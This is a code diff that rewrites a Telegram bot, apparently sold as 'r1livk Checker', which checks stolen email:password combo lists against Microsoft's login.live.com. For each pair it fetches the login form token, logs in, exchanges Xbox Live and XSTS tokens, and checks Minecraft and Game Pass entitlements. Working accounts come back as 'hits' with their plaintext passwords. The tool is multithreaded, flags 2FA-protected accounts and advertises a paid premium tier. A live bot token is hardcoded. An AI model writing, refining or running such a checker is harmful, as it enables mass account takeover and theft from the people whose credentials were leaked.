@@ -1,113 +1,30 @@
 # -*- coding: utf-8 -*-
 """
-XBOX + MINECRAFT TELEGRAM CHECKER BOT - @llljjv
+r1livk Checker ⚡ - Telegram Bot (Full English & Fixed Thread-Safe)
 """
 
 import os
-import sys
-import time
-import requests
 import re
+import time
 import threading
-from urllib.parse import urlparse, parse_qs
+from concurrent.futures import ThreadPoolExecutor
+import requests
 import urllib3
+from urllib.parse import urlparse, parse_qs
 from requests.adapters import HTTPAdapter
-from datetime import datetime
-from telegram import Update
-from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
+import telebot
+from telebot import types
 
 urllib3.disable_warnings()
 
-# =================== الإعدادات العامة ===================
-BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
+TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
+bot = telebot.TeleBot(TOKEN)
 
-checked = 0
-total_combos = 0
-hits = 0
-bad = 0
-twofa = 0
-errors = 0
-gamepass_count = 0
-minecraft_count = 0
-gscore_count = 0
-start_time = 0
-is_running = False
-
-file_lock = threading.Lock()
-stats_lock = threading.Lock()
-account_counter = 0
-account_counter_lock = threading.Lock()
-
-DELAY_BETWEEN_CHECKS = 2
 REQUEST_TIMEOUT = 25
+MAX_THREADS = 20
 
-def setup_folders():
-    if not os.path.exists("XBOX_RESULT"):
-        os.makedirs("XBOX_RESULT")
-    if not os.path.exists("Hathoun"):
-        os.makedirs("Hathoun")
+active_scans = {}
 
-def load_existing_accounts(filename):
-    accounts = []
-    filepath = os.path.join("XBOX_RESULT", filename)
-    if os.path.exists(filepath):
-        try:
-            with open(filepath, 'r', encoding='utf-8') as f:
-                content = f.read()
-                raw_accounts = content.split('_________________________________________________________')
-                for raw_acc in raw_accounts:
-                    if raw_acc.strip():
-                        gscore_match = re.search(r'Gamerscore: (\d+)', raw_acc)
-                        if gscore_match:
-                            gscore = int(gscore_match.group(1))
-                            accounts.append({'content': raw_acc.strip(), 'gscore': gscore})
-        except Exception as e:
-            print(f"Error loading {filename}: {e}")
-    return accounts
-
-def remove_duplicates(accounts):
-    unique_accounts = {}
-    for acc in accounts:
-        email_match = re.search(r'Email: (.+?)\n', acc['content'])
-        if email_match:
-            email = email_match.group(1).strip()
-            if email not in unique_accounts:
-                unique_accounts[email] = acc
-            else:
-                if acc['gscore'] > unique_accounts[email]['gscore']:
-                    unique_accounts[email] = acc
-    return list(unique_accounts.values())
-
-def save_accounts_to_file(accounts, filepath):
-    if not accounts:
-        return 0
-    accounts = remove_duplicates(accounts)
-    accounts.sort(key=lambda x: x['gscore'], reverse=True)
-    for idx, acc in enumerate(accounts, 1):
-        acc['content'] = re.sub(r'Account number: \d+', f'Account number: {idx}', acc['content'])
-    with open(filepath, 'w', encoding='utf-8') as f:
-        for acc in accounts:
-            f.write(acc['content'] + '\n')
-    return len(accounts)
-
-def save_hit_immediately(account_type, content, gscore):
-    with file_lock:
-        if account_type == 'gamepass':
-            filename = "XBOX-GamePass.txt"
-        elif account_type == 'minecraft':
-            filename = "Minecraft-Hits.txt"
-        elif account_type == 'gscore':
-            filename = "G-Score-Hits.txt"
-        else:
-            return
-        
-        filepath = os.path.join("XBOX_RESULT", filename)
-        existing = load_existing_accounts(filename)
-        new_account = {'content': content, 'gscore': gscore}
-        existing.append(new_account)
-        save_accounts_to_file(existing, filepath)
-
-# =================== فحص الحسابات ===================
 def extract_ppft(text):
     patterns = [
         r'name="PPFT"[^>]*value="([^"]+)"',
@@ -118,53 +35,61 @@ def extract_ppft(text):
     for pattern in patterns:
         match = re.search(pattern, text, re.IGNORECASE)
         if match:
-            return match.group(1).replace('\\/', '/').replace('\\"', '"')
+            token = match.group(1)
+            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
+            return token
     return None
 
 def extract_url_post(text):
     patterns = [
         r'"urlPost":"([^"]+)"',
         r"urlPost:'([^']+)'",
-        r'id="fmHF"\s+action="([^"]+)"'
+        r'id="fmHF"\s+action="([^"]+)"',
+        r'action="([^"]+)"[^>]*id="fmHF"'
     ]
     for pattern in patterns:
         match = re.search(pattern, text, re.IGNORECASE)
         if match:
-            return match.group(1).replace('\\/', '/')
+            url = match.group(1)
+            url = url.replace('\\/', '/')
+            return url
     return None
 
-def check_account(combo, bot_app, chat_id):
-    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter
-
+def check_single_account(combo):
     parts = combo.split(':')
     if len(parts) < 2:
-        with stats_lock:
-            bad += 1
-            checked += 1
-        return
+        return "bad", None
 
     email = parts[0].strip()
     password = ':'.join(parts[1:]).strip()
-    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
+    adapter = HTTPAdapter(pool_connections=5, pool_maxsize=5)
 
     session = requests.Session()
     session.verify = False
     session.mount('https://', adapter)
+    session.mount('http://', adapter)
     session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Accept-Language": "en-US,en;q=0.9",
     })
 
     try:
-        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
+        sftag_url = (
+            "https://login.live.com/oauth20_authorize.srf"
+            "?client_id=00000000402B5328"
+            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+            "&display=touch"
+            "&response_type=token"
+            "&locale=en"
+        )
         resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
         sftag = extract_ppft(resp.text)
         url_post = extract_url_post(resp.text)
 
         if not sftag or not url_post:
-            with stats_lock:
-                bad += 1
-                checked += 1
-            return
+            session.close()
+            return "bad", None
 
         login_data = {
             'login': email,
@@ -175,37 +100,42 @@ def check_account(combo, bot_app, chat_id):
             'NewUser': '1',
             'LoginOptions': '3',
         }
-        login_req = session.post(url_post, data=login_data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
-        
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': sftag_url,
+            'Origin': 'https://login.live.com',
+        }
+        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
-        ms_token = None
 
+        ms_token = None
         if 'access_token' in login_req.url:
             ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
         elif 'access_token' in login_text:
             token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
             if token_match:
                 ms_token = token_match.group(1)
-
+        
         if not ms_token:
-            with stats_lock:
-                bad += 1
-                checked += 1
-            return
+            if any(x in login_text for x in ["recover", "identity/confirm", "locked", "security challenge", "two-step", "additional security"]):
+                session.close()
+                return "twofa", None
+            session.close()
+            return "bad", None
 
         xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
         xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=REQUEST_TIMEOUT)
-
+        
         if xb_req.status_code != 200:
-            with stats_lock:
-                bad += 1
-                checked += 1
-            return
+            session.close()
+            return "bad", None
 
         xb_token = xb_req.json()['Token']
         uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
 
-        gamertag, gamerscore, gscore_int = "N/A", "0", 0
+        gamertag = "N/A"
+        gamerscore = "0"
+        gscore_int = 0
         try:
             xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
             xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=REQUEST_TIMEOUT)
@@ -223,7 +153,7 @@ def check_account(combo, bot_app, chat_id):
         except:
             pass
 
-        has_gp, has_mc, gp_type, mc_ent_text = False, False, "", ""
+        mc_ent_text = ""
         try:
             xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
             xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, timeout=REQUEST_TIMEOUT)
@@ -240,128 +170,243 @@ def check_account(combo, bot_app, chat_id):
         except:
             pass
 
-        if 'product_game_pass_ultimate' in mc_ent_text:
-            gp_type, has_gp = "Game Pass Ultimate", True
-        elif 'product_game_pass_pc' in mc_ent_text:
-            gp_type, has_gp = "PC Game Pass", True
-
+        has_gp = 'product_game_pass' in mc_ent_text
         has_mc = 'product_minecraft' in mc_ent_text
 
-        with account_counter_lock:
-            account_counter += 1
-            current_num = account_counter
-
-        hit_content = f"""Account number: {current_num}
-Email: {email}
-Password: {password}
-Gamertag: {gamertag}
-Gamerscore: {gamerscore}
-Minecraft: {'Yes' if has_mc else 'No'}
-Game Pass: {gp_type if has_gp else 'No'}
-_________________________________________________________"""
-
-        with stats_lock:
-            if has_gp:
-                gamepass_count += 1
-                hits += 1
-                save_hit_immediately('gamepass', hit_content, gscore_int)
-            elif has_mc:
-                minecraft_count += 1
-                hits += 1
-                save_hit_immediately('minecraft', hit_content, gscore_int)
-            elif gscore_int > 0:
-                gscore_count += 1
-                hits += 1
-                save_hit_immediately('gscore', hit_content, gscore_int)
-            else:
-                bad += 1
-            checked += 1
-
-        if has_gp or has_mc or gscore_int > 0:
-            try:
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-                    "chat_id": chat_id,
-                    "text": f"🔥 *HIT FOUND!*\n\n{hit_content}",
-                    "parse_mode": "Markdown"
-                }, timeout=10)
-            except:
-                pass
-
-    except Exception:
-        with stats_lock:
-            errors += 1
-            checked += 1
-    finally:
         session.close()
 
-# =================== أوامر بوت تيليجرام ===================
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_text = (
-        "🔥 *XBOX + MINECRAFT CHECKER BOT*\n\n"
-        "أهلاً بك! استخدم الأمر التالي لبدء الفحص:\n"
-        "`/check` (مع إرفاق ملف الـ Combos بصيغة .txt مع الرسالة)"
-    )
-    await update.message.reply_text(welcome_text, parse_mode="Markdown")
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global is_running, checked, total_combos, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, start_time, account_counter
-    
-    if is_running:
-        await update.message.reply_text("⚠️ هناك عملية فحص قيد التشغيل حالياً، انتظر حتى تنتهي.")
-        return
-
-    doc = update.message.document
-    if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ يرجى إرسال ملف نصي بصيغة .txt فقط!")
-        return
-
-    file = await context.bot.get_file(doc.file_id)
-    file_path = "temp_combos.txt"
-    await file.download_to_drive(file_path)
-
-    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-        combos = [line.strip() for line in f if line.strip() and ':' in line]
-
-    if not combos:
-        await update.message.reply_text("❌ الملف فارغ أو لا يحتوي على صيغة (User:Pass) صحيحة.")
-        return
-
-    setup_folders()
-    total_combos = len(combos)
-    checked = hits = bad = twofa = errors = gamepass_count = minecraft_count = gscore_count = account_counter = 0
-    start_time = time.time()
-    is_running = True
-
-    await update.message.reply_text(f"🚀 بدء فحص {total_combos} حساباً بنجاح... سيتم إرسال الـ Hits تباعاً.")
-
-    def run_checking():
-        global is_running
-        import concurrent.futures
-        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-            futures = [executor.submit(check_account, combo, context.bot, update.effective_chat.id) for combo in combos]
-            concurrent.futures.as_completed(futures)
-        is_running = False
+        hit_info = (
+            f"📧 **Email:** `{email}`\n"
+            f"🔑 **Password:** `{password}`\n"
+            f"🎮 **Gamertag:** {gamertag}\n"
+            f"🏆 **Gamerscore:** {gamerscore}\n"
+            f"⛏️ **Minecraft:** {'Yes' if has_mc else 'No'}\n"
+            f"🎮 **Game Pass:** {'Yes' if has_gp else 'No'}\n"
+            f"-----------------------------------"
+        )
         
-        try:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-                "chat_id": update.effective_chat.id,
-                "text": f"✅ *انتهت عملية الفحص بنجاح!*\n\n📊 إجمالي الفحص: {checked}\n★ الـ Hits: {hits}\n🎮 Game Pass: {gamepass_count}\n⛏️ Minecraft: {minecraft_count}",
-                "parse_mode": "Markdown"
-            }, timeout=10)
-        except:
-            pass
+        if has_gp or has_mc or gscore_int > 0:
+            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_gp, "has_xbox": gscore_int > 0}
+        else:
+            return "bad", None
 
-    threading.Thread(target=run_checking, daemon=True).start()
+    except Exception:
+        if session:
+            session.close()
+        return "error", None
 
-# =================== تشغيل البوت ===================
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    btn_start = types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_checker")
+    btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15)", callback_data="buy_premium")
+    btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
+    markup.add(btn_start, btn_premium, btn_account)
+
+    text = (
+        "⚡ **r1livk Checker** ⚡\n\n"
+        "Welcome to the ultimate account checking bot.\n"
+        "Your Status: 👤 Free (0/10000 lines today)\n\n"
+        "Features:\n"
+        "• Xbox Game Pass Status\n"
+        "• Xbox Live Premium\n"
+        "• Gamertag & Profile\n"
+        "• Game entitlements\n"
+        "• Email Access & 2FA detection\n\n"
+        "Click the button below to start checking your combo files!"
+    )
+    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    chat_id = call.message.chat.id
+    if call.data == "start_checker":
+        markup = types.InlineKeyboardMarkup()
+        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_checker")
+        markup.add(btn_cancel)
+
+        text = (
+            "🎮 **r1livk Checker - Xbox + Minecraft + GamePass**\n\n"
+            "Full Xbox/Minecraft account capture:\n"
+            "• Minecraft Accounts\n"
+            "• Xbox Game Pass Status\n"
+            "• Xbox Live Premium\n"
+            "• Gamertag & Profile\n"
+            "• Game entitlements\n"
+            "• Email Access\n"
+            "• 2FA detection\n\n"
+            "Send your combo file in .txt format (Direct file upload)\n"
+            "Format: `email:password`\n\n"
+            "Max: 10000 lines / day"
+        )
+        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    
-    print("Bot is running...")
-    app.run_polling()
+    elif call.data == "cancel_checker" or call.data == "back_to_menu":
+        active_scans[chat_id] = False
+        send_welcome(call.message)
+
+    elif call.data == "stop_scan":
+        active_scans[chat_id] = False
+        bot.answer_callback_query(call.id, "⏹️ Scan stopped successfully.")
+
+    elif call.data == "buy_premium":
+        bot.answer_callback_query(call.id, "To buy the premium version, please contact the developer: @r1livk", show_alert=True)
+
+    elif call.data == "my_account":
+        bot.answer_callback_query(call.id, "Current Status: Free\nDaily Limit: 10000 lines", show_alert=True)
+
+@bot.message_handler(content_types=['document'])
+def handle_docs(message):
+    chat_id = message.chat.id
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+
+        local_path = f"temp_combo_{chat_id}.txt"
+        with open(local_path, 'wb') as f:
+            f.write(downloaded_file)
+
+        bot.reply_to(message, "📥 File received successfully. Starting high-speed scan...")
+        active_scans[chat_id] = True
+        threading.Thread(target=process_checker, args=(chat_id, local_path)).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"Error downloading file: {e}")
+
+def process_checker(chat_id, filepath):
+    with open(filepath, 'r', encoding='utf-8-sig', errors='ignore') as f:
+        lines = [line.strip() for line in f if line.strip() and ':' in line]
+
+    total = len(lines)
+    checked = 0
+    hits = 0
+    bad = 0
+    twofa = 0
+    errors = 0
+    mc_hits = 0
+    gp_hits = 0
+    xbox_hits = 0
+
+    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
+    output_filename = f"r1livk_Checker_hits_{timestamp_str}.txt"
+    start_time = time.time()
+
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    btn_stop = types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
+    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
+    markup.add(btn_stop, btn_back)
+
+    initial_status_text = (
+        f"🔥 **LIVE SCAN STATS**\n\n"
+        f"📊 Total: {total}\n"
+        f"✅ Checked: 0\n"
+        f"❌ Bad: 0\n"
+        f"🎯 Hits: 0\n"
+        f"📱 2FA: 0\n"
+        f"⚠️ Errors: 0\n\n"
+        f"Progress: 0.0%\n"
+        f"⚡ CPM: 0\n"
+        f"⏱️ Elapsed: 00:00:00"
+    )
+    status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)
+
+    lock = threading.Lock()
+
+    def worker(combo):
+        nonlocal checked, hits, bad, twofa, errors, mc_hits, gp_hits, xbox_hits
+        if not active_scans.get(chat_id, True):
+            return
+
+        status, data = check_single_account(combo)
+
+        with lock:
+            checked += 1
+            if status == "hit" and data:
+                hits += 1
+                if data["has_mc"]: mc_hits += 1
+                if data["has_gp"]: gp_hits += 1
+                if data["has_xbox"]: xbox_hits += 1
+
+                with open(output_filename, 'a', encoding='utf-8') as out_f:
+                    out_f.write(data["content"] + "\n\n")
+            elif status == "bad":
+                bad += 1
+            elif status == "twofa":
+                twofa += 1
+            else:
+                errors += 1
+
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        futures = [executor.submit(worker, line) for line in lines]
+        
+        while any(not f.done() for f in futures):
+            if not active_scans.get(chat_id, True):
+                executor.shutdown(wait=False, cancel_futures=True)
+                break
+            
+            with lock:
+                curr_checked = checked
+                curr_bad = bad
+                curr_hits = hits
+                curr_twofa = twofa
+                curr_errors = errors
+                curr_mc = mc_hits
+                curr_gp = gp_hits
+                curr_xb = xbox_hits
+
+            elapsed = int(time.time() - start_time)
+            if elapsed > 0:
+                mins, secs = divmod(elapsed, 60)
+                hrs, mins = divmod(mins, 60)
+                cpm = int((curr_checked / elapsed) * 60) if elapsed > 0 else 0
+                pct = (curr_checked / total) * 100 if total > 0 else 0
+
+                live_text = (
+                    f"🔥 **LIVE SCAN STATS (Auto-refresh)**\n\n"
+                    f"📊 Total: {total}\n"
+                    f"✅ Checked: {curr_checked}\n"
+                    f"❌ Bad: {curr_bad}\n"
+                    f"🎯 Hits: {curr_hits}\n"
+                    f"📱 2FA: {curr_twofa}\n"
+                    f"⚠️ Errors: {curr_errors}\n\n"
+                    f"Progress: {pct:.1f}%\n"
+                    f"⚡ CPM: {cpm}\n"
+                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}\n\n"
+                    f"🎮 Gaming Hits:\n"
+                    f"• MC Hits: {curr_mc}\n"
+                    f"• GamePass Hits: {curr_gp}\n"
+                    f"• Xbox Live: {curr_xb}"
+                )
+                try:
+                    bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
+                except:
+                    pass
+            time.sleep(1.5)
+
+    elapsed_total = int(time.time() - start_time)
+    t_mins, t_secs = divmod(elapsed_total, 60)
+
+    completion_text = (
+        f"✅ **XBOX + MINECRAFT + GAMEPASS SCAN COMPLETED!**\n\n"
+        f"📊 Total: {total}\n"
+        f"🎯 Hits: {hits}\n"
+        f"  • Minecraft: {mc_hits}\n"
+        f"  • GamePass: {gp_hits}\n"
+        f"  • Xbox Live: {xbox_hits}\n"
+        f"📱 2FA: {twofa}\n"
+        f"❌ Bad: {bad}\n\n"
+        f"⏱️ Time: {t_mins:02d}:{t_secs:02d}"
+    )
+    bot.send_message(chat_id, completion_text, parse_mode="Markdown")
+
+    if hits > 0 and os.path.exists(output_filename):
+        with open(output_filename, 'rb') as res_f:
+            bot.send_document(chat_id, res_f, caption=f"📁 All Hits File - r1livk Checker")
+
+    if os.path.exists(filepath):
+        os.remove(filepath)
+    active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    main()
+    print("r1livk Checker High-Speed Bot is running...")
+    bot.infinity_polling()
